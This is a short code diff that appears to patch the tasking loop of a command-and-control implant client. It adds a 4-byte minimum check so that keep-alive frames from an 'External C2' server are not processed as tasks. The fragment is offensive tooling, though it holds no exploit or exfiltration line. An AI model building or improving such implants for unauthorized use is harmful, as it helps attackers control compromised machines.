@@ -109,7 +109,10 @@ void client_write(char * buffer, int len) {
 		length = LCHANNEL_READ_FRAME(server, client_read_buffer, MAX_GET);
 		if (length > 0) {
 			length = security_decrypt(client_read_buffer, length);
-			if (length > 0) {
+			/* sub-4-byte frames are transport keep-alives (the External C2
+			 * server emits a 1-byte no-op when no tasks exist); a real task
+			 * is at least the 4-byte command word. */
+			if (length >= 4) {
 				process_payload(client_read_buffer, length);
 			}
 		}
@@ -158,7 +161,8 @@ void client_process() {
 
 		if (length > 0) {
 			length = security_decrypt(client_read_buffer, length);
-			if (length > 0) {
+			/* keep-alive guard, see client_write() */
+			if (length >= 4) {
 				process_payload(client_read_buffer, length);
 			}
 		}
